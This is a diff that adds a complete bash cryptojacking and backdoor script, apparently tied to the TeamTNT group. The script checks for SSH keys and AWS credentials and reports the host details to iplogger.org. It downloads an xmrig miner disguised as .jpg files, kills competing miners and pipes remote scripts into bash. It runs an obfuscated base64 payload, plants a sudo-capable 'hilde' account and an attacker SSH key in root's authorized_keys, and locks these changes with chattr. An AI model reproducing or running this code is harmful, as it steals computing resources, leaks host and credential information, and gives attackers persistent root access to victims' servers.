@@ -1,0 +1,439 @@
+#!/bin/bash
+
+    if [ -f "/root/.ssh/id_rsa" ]
+    then
+			echo 'found: /root/.ssh/id_rsa'
+    fi
+
+    if [ -f "/home/*/.ssh/id_rsa" ]
+    then
+			echo 'found: /home/*/.ssh/id_rsa'
+    fi
+
+    if [ -f "/root/.aws/credentials" ]
+    then
+			echo 'found: /root/.aws/credentials'
+    fi
+
+    if [ -f "/home/*/.aws/credentials" ]
+    then
+			echo 'found: /home/*/.aws/credentials'
+    fi
+
+$(curl -s -k https://iplogger.org/1Nuxp7 --user-agent "TNTcurl" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="TNTwget" https://iplogger.org/1Nuxp7 --no-check-certificate --referer="$(uname -a)")
+
+MOxmrigMOD=http://129.211.98.236/xmr/mo/mod.jpg
+MOxmrigSTOCK=http://129.211.98.236/xmr/mo/stock.jpg
+
+VERSION=2.9
+
+function KILLMININGSERVICES(){
+rm -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
+pkill -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
+killall -9 docker-update  2>/dev/null 1>/dev/null
+
+rm -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
+pkill -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
+killall -9 redis-backup 2>/dev/null 1>/dev/null
+
+rm -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
+pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
+rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
+killall -9 xmrig 2>/dev/null 1>/dev/null
+
+$(curl http://129.211.98.236/ps/clean.jpg | bash || wget -O - http://129.211.98.236/ps/clean.jpg| bash)
+
+}
+
+
+
+# printing greetings
+
+if [ "$(id -u)" == "0" ]; then
+  echo "WARNING: Generally it is not adviced to run this script under root"
+fi
+
+# command line arguments
+WALLET=88ZrgnVZ687Wg8ipWyapjCVRWL8yFMRaBDrxtiPSwAQrNz5ZJBRozBSJrCYffurn1Qg7Jn7WpRQSAA3C8aidaeadAn4xi4k
+EMAIL=hilde@teamtnt.red
+export MOHOME=/usr/share
+mkdir $MOHOME -p
+# checking prerequisites
+
+if [ -z $WALLET ]; then
+  echo "ERROR: wallet"
+  exit 1
+fi
+
+WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
+if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
+  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
+  exit 1
+fi
+
+if [ -z $MOHOME ]; then
+  echo "ERROR: Please define HOME environment variable to your home directory"
+  exit 1
+fi
+
+if [ ! -d $MOHOME ]; then
+  echo "ERROR: Please make sure HOME directory $MOHOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
+
+if ! type curl >/dev/null; then
+apt-get update --fix-missing
+apt-get install -y curl
+apt-get install -y --reinstall curl
+fi
+
+if ! type lscpu >/dev/null; then
+apt-get update --fix-missing
+apt-get install -y util-linux
+apt-get install -y --reinstall util-linux
+
+
+
+fi
+
+#if ! sudo -n true 2>/dev/null; then
+#  if ! pidof systemd >/dev/null; then
+#    echo "ERROR: This script requires systemd to work correctly"
+#    exit 1
+#  fi
+#fi
+
+# calculating port
+
+LSCPU=`lscpu`
+CPU_SOCKETS=`echo "$LSCPU" | grep "^Socket(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+if [ -z $CPU_SOCKETS ]; then
+  echo "WARNING: Can't get CPU sockets from lscpu output"
+  export CPU_SOCKETS=1
+fi
+CPU_CORES_PER_SOCKET=`echo "$LSCPU" | grep "^Core(s) per socket:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+if [ -z "$CPU_CORES_PER_SOCKET" ]; then
+  echo "WARNING: Can't get CPU cores per socket from lscpu output"
+  export CPU_CORES_PER_SOCKET=1
+fi
+CPU_THREADS=`echo "$LSCPU" | grep "^CPU(s):" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+if [ -z "$CPU_THREADS" ]; then
+  echo "WARNING: Can't get CPU cores from lscpu output"
+  if ! type nproc >/dev/null; then
+    echo "WARNING: This script requires \"nproc\" utility to work correctly"
+    export CPU_THREADS=1
+  else
+    CPU_THREADS=`nproc`
+    if [ -z "$CPU_THREADS" ]; then
+      echo "WARNING: Can't get CPU cores from nproc output"
+      export CPU_THREADS=1
+    fi
+  fi
+fi
+CPU_MHZ=`echo "$LSCPU" | grep "^CPU MHz:" | cut -d':' -f2 | sed "s/^[ \t]*//"`
+CPU_MHZ=${CPU_MHZ%.*}
+if [ -z "$CPU_MHZ" ]; then
+  echo "WARNING: Can't get CPU MHz from lscpu output"
+  export CPU_MHZ=1000
+fi
+CPU_L1_CACHE=`echo "$LSCPU" | grep "^L1d" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
+if echo "$CPU_L1_CACHE" | grep MiB >/dev/null; then
+  CPU_L1_CACHE=`echo "$CPU_L1_CACHE" | sed "s/ MiB\$//"`
+  CPU_L1_CACHE=$(( $CPU_L1_CACHE * 1024))
+fi
+if [ -z "$CPU_L1_CACHE" ]; then
+  echo "WARNING: Can't get L1 CPU cache from lscpu output"
+  export CPU_L1_CACHE=16
+fi
+CPU_L2_CACHE=`echo "$LSCPU" | grep "^L2" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
+if echo "$CPU_L2_CACHE" | grep MiB >/dev/null; then
+  CPU_L2_CACHE=`echo "$CPU_L2_CACHE" | sed "s/ MiB\$//"`
+  CPU_L2_CACHE=$(( $CPU_L2_CACHE * 1024))
+fi
+if [ -z "$CPU_L2_CACHE" ]; then
+  echo "WARNING: Can't get L2 CPU cache from lscpu output"
+  export CPU_L2_CACHE=256
+fi
+CPU_L3_CACHE=`echo "$LSCPU" | grep "^L3" | cut -d':' -f2 | sed "s/^[ \t]*//" | sed "s/ \?K\(iB\)\?\$//"`
+if echo "$CPU_L3_CACHE" | grep MiB >/dev/null; then
+  CPU_L3_CACHE=`echo "$CPU_L3_CACHE" | sed "s/ MiB\$//"`
+  CPU_L3_CACHE=$(( $CPU_L3_CACHE * 1024))
+fi
+if [ -z "$CPU_L3_CACHE" ]; then
+  echo "WARNING: Can't get L3 CPU cache from lscpu output"
+  export CPU_L3_CACHE=2048
+fi
+
+TOTAL_CACHE=$(( $CPU_THREADS*$CPU_L1_CACHE + $CPU_SOCKETS * ($CPU_CORES_PER_SOCKET*$CPU_L2_CACHE + $CPU_L3_CACHE)))
+if [ -z $TOTAL_CACHE ]; then
+  echo "ERROR: Can't compute total cache"
+  exit 1
+fi
+EXP_MONERO_HASHRATE=$(( ($CPU_THREADS < $TOTAL_CACHE / 2048 ? $CPU_THREADS : $TOTAL_CACHE / 2048) * ($CPU_MHZ * 20 / 1000) * 5 ))
+if [ -z $EXP_MONERO_HASHRATE ]; then
+  echo "ERROR: Can't compute projected Monero CN hashrate"
+  exit 1
+fi
+
+power2() {
+apt install -y bc 2>/dev/null 1>/dev/null
+yum install -y bc 2>/dev/null 1>/dev/null	
+	
+  if ! type bc >/dev/null; then
+    if [ "$1" -gt "204800" ]; then
+      echo "8192"
+    elif [ "$1" -gt "102400" ]; then
+      echo "4096"
+    elif [ "$1" -gt "51200" ]; then
+      echo "2048"
+    elif [ "$1" -gt "25600" ]; then
+      echo "1024"
+    elif [ "$1" -gt "12800" ]; then
+      echo "512"
+    elif [ "$1" -gt "6400" ]; then
+      echo "256"
+    elif [ "$1" -gt "3200" ]; then
+      echo "128"
+    elif [ "$1" -gt "1600" ]; then
+      echo "64"
+    elif [ "$1" -gt "800" ]; then
+      echo "32"
+    elif [ "$1" -gt "400" ]; then
+      echo "16"
+    elif [ "$1" -gt "200" ]; then
+      echo "8"
+    elif [ "$1" -gt "100" ]; then
+      echo "4"
+    elif [ "$1" -gt "50" ]; then
+      echo "2"
+    else 
+      echo "1"
+    fi
+  else 
+    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
+  fi
+}
+
+PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
+PORT=$(( $PORT == 0 ? 1 : $PORT ))
+PORT=`power2 $PORT`
+PORT=$(( 10000 + $PORT ))
+if [ -z $PORT ]; then
+  echo "ERROR: Can't compute port"
+  exit 1
+fi
+
+if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
+  echo "ERROR: Wrong computed port value: $PORT"
+  exit 1
+fi
+
+
+# printing intentions
+echo
+echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total,"
+echo " so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
+echo
+
+echo "Sleeping for 2 seconds before continuing (press Ctrl+C to cancel)"
+sleep 2
+echo
+echo
+
+# start doing stuff: preparing miner
+
+echo "[*] Removing previous moneroocean miner (if any)"
+if sudo -n true 2>/dev/null; then
+  sudo systemctl stop crypto.service
+fi
+killall -9 xmrig
+
+KILLMININGSERVICES
+
+#echo "[*] Removing $MOHOME/ directory"
+#rm -rf $MOHOME/
+
+echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "$MOxmrigMOD" -o /tmp/xmrig.tar.gz; then
+  echo "ERROR: Can't download $MOxmrigMOD file to /tmp/xmrig.tar.gz"
+  exit 1
+fi
+
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
+[ -d $MOHOME/ ] || mkdir $MOHOME/
+if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
+  exit 1
+fi
+rm /tmp/xmrig.tar.gz
+
+echo "[*] Checking if advanced version of $MOHOME/xmrig works fine (and not removed by antivirus software)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/[crypto].pid
+$MOHOME/[crypto] --help >/dev/null
+if (test $? -ne 0); then
+  if [ -f $MOHOME/[crypto] ]; then
+    echo "WARNING: Advanced version of $MOHOME/xmrig is not functional"
+  else 
+    echo "WARNING: Advanced version of $MOHOME/xmrig was removed by antivirus (or some other problem)"
+  fi
+
+  echo "[*] Looking for the latest version of Monero miner"
+  #LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
+  LATEST_XMRIG_LINUX_RELEASE=$MOxmrigSTOCK
+
+  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
+  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
+    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
+    exit 1
+  fi
+
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $MOHOME/"
+  if ! tar xf /tmp/xmrig.tar.gz -C $MOHOME/ --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $MOHOME/ directory"
+  fi
+  rm /tmp/xmrig.tar.gz
+
+  echo "[*] Checking if stock version is OKAY!"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $MOHOME/[crypto].pid
+  $MOHOME/[crypto] --help >/dev/null
+  if (test $? -ne 0); then 
+    if [ -f $MOHOME/[crypto] ]; then
+      echo "ERROR: Stock version of $MOHOME/[crypto] is not functional too"
+    else 
+      echo "ERROR: Stock version of $MOHOME/[crypto] was removed by antivirus too"
+    fi
+    exit 1
+  fi
+fi
+
+echo "[*] $MOHOME/[crypto] is OK"
+
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
+if [ ! -z $EMAIL ]; then
+  PASS="$PASS:$EMAIL"
+fi
+
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $MOHOME/[crypto].pid
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $MOHOME/[crypto].pid
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $MOHOME/[crypto].pid
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $MOHOME/[crypto].pid
+sed -i 's#"log-file": *null,#"log-file": "'$MOHOME/[crypto].log'",#' $MOHOME/[crypto].pid
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $MOHOME/[crypto].pid
+
+cp $MOHOME/[crypto].pid $MOHOME/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $MOHOME/config_background.json
+
+# preparing script
+
+echo "[*] Creating $MOHOME/[crypto].sh script"
+cat >$MOHOME/[crypto].sh <<EOL
+#!/bin/bash
+if ! pidof [crypto] >/dev/null; then
+  nice $MOHOME/[crypto] \$*
+else
+  echo "Monero miner is already running in the background. Refusing to run another one."
+  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
+fi
+EOL
+
+chmod +x $MOHOME/[crypto].sh
+
+# preparing script background work and work under reboot
+
+if ! sudo -n true 2>/dev/null; then
+  if ! grep $MOHOME/[crypto].sh /root/.profile >/dev/null; then
+    echo "[*] Adding $MOHOME/[crypto].sh script to /root/.profile"
+    echo "$MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1" >>/root/.profile
+  else 
+    echo "Looks like $MOHOME/[crypto].sh script is already in the /root/.profile"
+  fi
+  echo "[*] Running crypto service in the background (see logs in $MOHOME/[crypto].log file)"
+  /bin/bash $MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1
+else
+
+  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
+    echo "[*] Enabling huge pages"
+    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
+    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+  fi
+
+  if ! type systemctl >/dev/null; then
+
+    /bin/bash $MOHOME/[crypto].sh --config=$MOHOME/config_background.json >/dev/null 2>&1
+
+  else
+
+    echo "[*] Creating crypto systemd service"
+    cat >/tmp/crypto.service <<EOL
+[Unit]
+Description=crypto system service
+
+[Service]
+ExecStart=$MOHOME/[crypto] --config=$MOHOME/[crypto].pid
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
+EOL
+    sudo mv /tmp/crypto.service /etc/systemd/system/crypto.service
+    echo "[*] Starting crypto systemd service"
+    sudo killall [crypto] 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable crypto.service
+    sudo systemctl start crypto.service
+  fi
+fi
+
+echo ""
+echo "[*] Setup complete"
+
+
+service crypto status || echo 'IyEvYmluL3NoCmN1cmwgaHR0cDovLzEyOS4yMTEuOTguMjM2L3htci9tby9tby5qcGcgfCBiYXNoCndnZXQgaHR0cDovLzEyOS4yMTEuOTguMjM2L2JkL2t1YmUuanBnIC1PIC91c3IvYmluL2t1YmUgfHwgY3VybCBodHRwOi8vMTI5LjIxMS45OC4yMzYvYmQva3ViZS5qcGcgLW8gL3Vzci9iaW4va3ViZTsgY2htb2QgK3ggL3Vzci9iaW4va3ViZTsgL3Vzci9iaW4va3ViZQp3Z2V0IC1xIGh0dHA6Ly8xMjkuMjExLjk4LjIzNi9kb2NrZXItdXBkYXRlIC1PIC91c3Ivc2Jpbi9kb2NrZXItdXBkYXRlIHx8IGN1cmwgLXMgaHR0cDovLzEyOS4yMTEuOTguMjM2L2RvY2tlci11cGRhdGUgLW8gL3Vzci9zYmluL2RvY2tlci11cGRhdGUKY2htb2QgK3ggL3Vzci9zYmluL2RvY2tlci11cGRhdGUgMj4vZGV2L251bGwgMT4vZGV2L251bGwKY2hhdHRyICtpIC91c3Ivc2Jpbi9kb2NrZXItdXBkYXRlIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCnRudHJlY2h0ICtpIC91c3Ivc2Jpbi9kb2NrZXItdXBkYXRlIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCi91c3Ivc2Jpbi9kb2NrZXItdXBkYXRlIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsCmhpc3RvcnkgLWM=' | base64 -d | sh
+
+function makesshaxx(){
+RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/g11TQs97a6DPQbrbIGvbNzbRVJgXw1OLrLFJDWFc1t+52tVFvkLHjWikS/X2nvyjW826YjbglNVUdkV3hzG+ApvvaLn+v20SzI5bs48Yyv+APczVp0LO2e6o1WLHyRNwYMZEiGI30lGIuUmBleH1XXeR+KBdMr0nqN0V18jmGtxYEBM9gwhD8VSCDFjLA5vE0uciqpn58oOSS3la+25fQyrFEN/S1orI2arh0qsfdrWIQ6ftLgtBW4F52maKMjpBXi/MugMMqbog6S4Sm3S6Pnh79clL7A1ghNnt3/pAUOxXKlWqopwueBFfGF56UExYn5h4bpyF8gd9ZGdUJJxBgLtG80BgLDa+ZT8deJ4K4QMKbwkS2PjlHzf6GzF8BR2UNmoaejFzcHAalNhKxhdybvfDR9djCc5c2Tjt+2HQIUsHdDWknbcUcvjQpJBRc1BRlNBX1y0M5oaPSfgRInRv75Dw4TfYazM1QFWJCKs+8tvQJncz5dHeAaaNfXQKk3EVzS5WRpy2wYsTjU0kZrKiWDTu6PDS2uwY8p7SsSdGfC1xYNonCEeHCuDNGOYVetxjy3IS7kWyXl5mFZmZVjSTub7/T6k6KwrlzwmCVG46Y2FFyH1Vpx8dWKUkB2fQS3pBCD4jw1GdbsmfaM0YQBthIh8h9jN1Uieo++IMymiAdw== hilde@teamtnt.red"
+
+grep -q hilde /etc/passwd || chattr -i /etc/passwd 2>/dev/null 1>/dev/null; tntrecht -i /etc/passwd 2>/dev/null 1>/dev/null; echo 'hilde:x:1000:1000::/home/hilde:/bin/bash' >> /etc/passwd 2>/dev/null 1>/dev/null; chattr +i /etc/passwd 2>/dev/null 1>/dev/null; tntrecht +i /etc/passwd 2>/dev/null 1>/dev/null
+grep -q hilde /etc/shadow || chattr -i /etc/shadow 2>/dev/null 1>/dev/null; tntrecht -i /etc/shadow 2>/dev/null 1>/dev/null; echo 'hilde:/BnKiPmXA2eAQ:18461:0:99999:7:::' >> /etc/shadow 2>/dev/null 1>/dev/null; chattr +i /etc/shadow 2>/dev/null 1>/dev/null; tntrecht +i /etc/shadow 2>/dev/null 1>/dev/null
+grep -q hilde /etc/sudoers || chattr -i /etc/sudoers 2>/dev/null 1>/dev/null; tntrecht -i /etc/sudoers 2>/dev/null 1>/dev/null; echo 'hilde  ALL=(ALL:ALL) ALL' >> /etc/sudoers 2>/dev/null 1>/dev/null; chattr +i /etc/sudoers 2>/dev/null 1>/dev/null; tntrecht +i /etc/sudoers 2>/dev/null 1>/dev/null
+
+mkdir /home/hilde/.ssh/ -p 2>/dev/null 1>/dev/null
+touch /home/hilde/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+touch /home/hilde/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+grep -q hilde@teamtnt.red /home/hilde/.ssh/authorized_keys || chattr -i /home/hilde/.ssh/authorized_keys 2>/dev/null 1>/dev/null; tntrecht -i /home/hilde/.ssh/authorized_keys 2>/dev/null 1>/dev/null; echo $RSAKEY > /home/hilde/.ssh/authorized_keys 2>/dev/null 1>/dev/null; chattr +i /home/hilde/.ssh/authorized_keys 2>/dev/null 1>/dev/null; tntrecht +i /home/hilde/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+grep -q hilde@teamtnt.red /home/hilde/.ssh/authorized_keys2 || chattr -i /home/hilde/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; tntrecht -i /home/hilde/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; echo $RSAKEY > /home/hilde/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; chattr +i /home/hilde/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; tntrecht +i /home/hilde/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+
+
+mkdir /root/.ssh/ -p 2>/dev/null 1>/dev/null
+touch /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+touch /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+grep -q hilde@teamtnt.red /root/.ssh/authorized_keys || chattr -i /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null; tntrecht -i /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null; echo $RSAKEY >> /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null; chattr +i /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null; tntrecht +i /root/.ssh/authorized_keys 2>/dev/null 1>/dev/null
+grep -q hilde@teamtnt.red /root/.ssh/authorized_keys2 || chattr -i /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; tntrecht -i /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; echo $RSAKEY > /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; chattr +i /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null; tntrecht +i /root/.ssh/authorized_keys2 2>/dev/null 1>/dev/null
+
+}
+
+makesshaxx
+
+if [ -f /root/.ssh/id_rsa ]; then
+echo "found rsa"
+$(curl -s -k https://iplogger.org/133yw7 --user-agent "TNTcurl" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="TNTwget" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")
+fi
+
+if [ -f /home/*/.ssh/id_rsa ]; then
+echo "found rsa"
+$(curl -s -k https://iplogger.org/133yw7 --user-agent "TNTcurl" --referer "$(uname -a)" -o /dev/null || wget -q -O /dev/null --user-agent="TNTwget" https://iplogger.org/133yw7 --no-check-certificate --referer="$(uname -a)")
+fi
+
+nohup $(curl http://129.211.98.236/ds/ds.jpg | bash || wget -O - http://129.211.98.236/ds/ds.jpg | bash) &
+
+
+
